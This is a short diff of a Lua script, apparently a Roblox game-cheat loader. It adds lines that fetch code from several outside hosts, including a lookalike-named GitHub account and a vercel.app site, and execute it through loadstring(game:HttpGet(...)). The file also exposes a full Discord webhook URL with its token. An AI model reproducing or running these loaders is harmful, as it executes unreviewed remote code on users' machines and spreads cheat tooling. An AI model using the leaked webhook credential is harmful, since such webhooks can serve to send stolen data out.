@@ -8,7 +8,13 @@ getgenv().LoadSettings = {
 }
 loadstring(game:HttpGet("https://HugeGames.io/ps99"))()
 
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/lenutjr/lenut/main/scripts"))()
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/IExpIoit/Script/main/UltimateHub"))()
+
+loadstring(game:HttpGet("https://astronomic.vercel.app"))()
 
 
 https://discord.com/api/webhooks/1206578588581896242/wvsQ-5NNmS1YslaxP2-xMuF_gk6_brLD0WEIHcIZL86rFRHU-KIg5m8LOmati2QX6w7Z
